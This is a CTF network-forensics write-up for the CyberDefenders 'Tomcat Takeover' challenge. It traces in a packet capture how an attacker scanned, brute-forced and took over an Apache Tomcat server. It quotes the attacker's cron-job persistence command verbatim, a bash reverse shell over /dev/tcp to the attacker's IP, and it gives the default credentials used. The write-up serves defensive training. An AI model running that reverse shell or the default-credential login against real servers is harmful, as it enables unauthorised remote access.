# [CyberDefenders - Tomcat Takeover](https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/)
Created: 22/02/2024 10:30
Last Updated: 22/02/2024 11:32
* * *
>Category: Network Forensics
>Tags: Wireshark, PCAP, Tomcat, Network, NetworkMiner, T1071, T1083, T1110, T1027, T1053.003, T1059, T1595
* * *
**Scenario**:
Our SOC team has detected suspicious activity on one of the web servers within the company's intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further.

Tools:
- [Wireshark](https://www.wireshark.org/download.html)
- [NetworkMiner](https://www.netresec.com/?page=NetworkMiner)
***
## Questions
> Q1: Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

![3d442e3a446f348ae6685626b1ffd015.png](../../_resources/3d442e3a446f348ae6685626b1ffd015-1.png)
I used http filter and found that the server might be `10.0.0.112` running on port `8080`
![da93e93362697a2cb76dad531f5f9bbd.png](../../_resources/da93e93362697a2cb76dad531f5f9bbd-1.png)
![1dbc530e5e62dffe7cebc1cf8e7e745f.png](../../_resources/1dbc530e5e62dffe7cebc1cf8e7e745f-1.png)
I kept scrolling and found something suspicious, there were a lot of 4xx Error from the server response to `14.0.0.120` and it seems like this IP address is an attacker

Looking at the User-Agent, it seems like this attacker used [Gobuster](https://github.com/OJ/gobuster) a brute forcing tool to enumerate directories on the server
```
14.0.0.120
```

> Q2: 
Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated?

![0b38b8b83f669ba738b2c7ce9058f73d.png](../../_resources/0b38b8b83f669ba738b2c7ce9058f73d-1.png)
```
Guangzhou
```

> Q3: 
From the pcap analysis, multiple open ports were detected as a result of the attacker's activitie scan. Which of these ports provides access to the web server admin panel?

![db7dfbf450ae4fd298ac76ac93c1f9a7.png](../../_resources/db7dfbf450ae4fd298ac76ac93c1f9a7-1.png)
```
8080
```

> Q4: 
Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?
```
gobuster
```

> Q5: Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?

![ca2c8c1c6bbcf155ddee4e71611e47e0.png](../../_resources/ca2c8c1c6bbcf155ddee4e71611e47e0-1.png)
The `/admin` was not right so I kept scrolling and found that `/manager` is likely to be the one I was looking for
```
/manager
```

> Q6: Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?

![c26fd6816301db342e91e572813a500d.png](../../_resources/c26fd6816301db342e91e572813a500d-1.png)
After found the admin panel, the attacker bruteforcing out
![ba68edd11dc8f034f44d5fc5f3b3a0e1.png](../../_resources/ba68edd11dc8f034f44d5fc5f3b3a0e1-1.png)
Follow the HTTP stream, And look like the user credential were presented on the page source but it's not the right one so I kept searching
![a19f3a664a15fbd1b1edc3347e9043cd.png](../../_resources/a19f3a664a15fbd1b1edc3347e9043cd-1.png)
And I finally found it, on the HTTP POST method
```
admin:tomcat
```

> Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

![14c85f398c10e8826b97d2312705f0ca.png](../../_resources/14c85f398c10e8826b97d2312705f0ca-1.png)
On the HTTP POST Method, I follow the TCP stream and found the file name of the uploaded file
```
JXQOZY.war
```

> Q8: Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

![bdc75ed35229fef54135ebceec256d2a.png](../../_resources/bdc75ed35229fef54135ebceec256d2a-1.png)
After the attacker uploaded a reverse shell to the server, the attacker triggered it and connection were established
![749fe59ca664cc6214844e825816513c.png](../../_resources/749fe59ca664cc6214844e825816513c-1.png)
I followed the TCP stream of that connection and found that the attacker added the bash reverse shell to cronjob so this is the way for an attacker to stay persistance
```
/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

![7d75d6b9739a0c9a3eaeec231fc869ee.png](../../_resources/7d75d6b9739a0c9a3eaeec231fc869ee-1.png)
* * *